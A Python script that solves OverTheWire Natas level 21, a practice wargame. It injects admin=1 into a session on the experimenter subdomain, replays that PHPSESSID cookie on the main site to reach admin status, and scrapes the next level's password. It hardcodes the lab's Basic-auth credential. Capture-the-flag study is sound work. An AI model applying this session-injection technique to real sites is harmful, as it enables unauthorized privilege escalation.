

import requests
import copy
import re

proxies={
    'http' : '127.0.0.1:8080',
    'https' : '127.0.0.1:8080'
}
authorization = ''

session = requests.Session() # cookies received will be stored in the session object

session.post(
    'http://natas21-experimenter.natas.labs.overthewire.org/index.php',
    data={
        'submit' : '1',
        'admin'  : '1'
    },
    headers = {
        'Host' : 'natas21-experimenter.natas.labs.overthewire.org',
        'Authorization' : 'Basic bmF0YXMyMTpJRmVrUHlyUVhmdHppREVzVXIzeDIxc1l1YWh5cGRnSg==',
        'Referer' : 'http://natas21-experimenter.natas.labs.overthewire.org'
    },
    proxies=proxies
)   # we are only interested in the PHPSESSID cookie

cookie_exper = None
for c in session.cookies:
    if c.name == 'PHPSESSID' and c.domain == 'natas21-experimenter.natas.labs.overthewire.org':
        cookie_exper = c
        break
assert(cookie_exper is not None)
cookie_normal = copy.deepcopy(cookie_exper)
cookie_normal.domain = 'natas21.natas.labs.overthewire.org'
session.cookies.set_cookie(cookie_normal)

r = session.get(
    'http://natas21.natas.labs.overthewire.org',
    params = { 'debug' : 1},
    headers = {
        'Host' : 'natas21.natas.labs.overthewire.org',
        'Authorization' : 'Basic bmF0YXMyMTpJRmVrUHlyUVhmdHppREVzVXIzeDIxc1l1YWh5cGRnSg=='
    },
    proxies=proxies
)

if 'You are an admin.' in r.text:
    print("Admin credentials found!")
    match = re.search(r'^Password: ([a-zA-Z0-9]+)</pre>.*', r.text, re.MULTILINE)
    if match:    
        print("")
        print("Credentials for Natas level22")
        print("UN: natas22")
        print("PW: " + match.groups()[0])
        print("")
else:
    assert(False and 'Exploit is 100% reliable')
